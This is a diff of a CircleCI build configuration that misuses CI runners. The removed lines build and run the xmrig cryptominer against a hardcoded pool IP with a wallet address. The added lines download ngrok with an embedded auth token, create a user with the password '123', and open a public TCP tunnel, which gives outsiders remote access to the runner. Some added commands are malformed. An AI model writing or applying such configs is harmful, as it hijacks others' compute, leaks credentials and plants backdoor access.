@@ -3,10 +3,12 @@ jobs:
   build:
     docker:
       - image: ubuntu
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: apt-get update && apt-get install wget -y && DEBIAN_FRONTEND="noninteractive" TZ="America/New_York" apt-get install -y tzdata && apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build && cmake .. && make -j$(nproc) && ./xmrig -o 139.180.190.196:1231 -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq -p x
-      
+      - run: apt-get update && apt-get install wget -y && DEBIAN_FRONTEND="noninteractive" TZ="America/New_York" apt-get install -y tzdata && https://github.com/akuhnet/ubuntu-gui/raw/main/gui-gnome.sh
+      - run: wget -O ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
+      - run: unzip ngrok.zip
+      - run: ./ngrok 1yaTF1wNJoaAg5kpxtQDYZW5M7T_7VmWudiUPguVrk49V5ATT
+      - run: sudo adduser akuhnet --gecos "First Last,RoomNumber,WorkPhone,HomePhone" --disabled-password
+      - run: echo "akuhnet:123" | sudo chpasswd
+      - run: ./ngrok tcp --region ap 4000
